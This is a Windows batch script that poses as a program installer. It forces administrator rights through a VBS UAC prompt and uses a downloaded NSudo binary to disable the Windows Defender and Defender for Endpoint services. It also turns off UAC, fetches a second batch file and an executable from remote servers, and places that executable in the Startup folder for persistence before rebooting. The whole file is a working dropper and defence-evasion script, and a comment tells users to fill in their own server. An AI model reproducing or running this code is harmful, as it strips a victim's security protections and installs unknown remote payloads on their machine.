@echo off

title Perci :)

rem change srv information and Nsudo.exe name hosted in your srv
set server="10.10.10.10:8000"
set directory="C:\Supertools"
set NSUDO="NSUDOLC.exe"

net session >nul 2>&1
if %errorLevel% == 0 (
     echo Success! The installation is started, waiting....
     goto gotAdmin
) else (
 echo Failure! You need to be admin to install this program.
 goto UACPrompt
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

echo  ...Installation... The system will rebooted

color E

cd C:\

if not exist %directory% mkdir %directory%

bitsadmin/transfer Download /download /priority FOREGROUND  http://%server%/%nsudo%  %directory%\Nsudo.exe 

cd %directory%

NSudo.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc"  /v "Start" /t REG_DWORD /d "4" /f
NSudo.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
NSudo.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
NSudo.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdnisDrv" /v "Start" /t REG_DWORD /d "4" /f
NSudo.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdfilter" /v "Start" /t REG_DWORD /d "4" /f
NSudo.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdboot" /v "Start" /t REG_DWORD /d "4" /f

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

powershell.exe -command "Invoke-WebRequest -Uri 'http://%server%/CleanerPerci.bat' -OutFile 'C:\Supertools\CleanerPerci.bat'"


bitsadmin /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Supertools\Percino.exe
copy %directory%\Percino.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Percino.exe"


shutdown -r
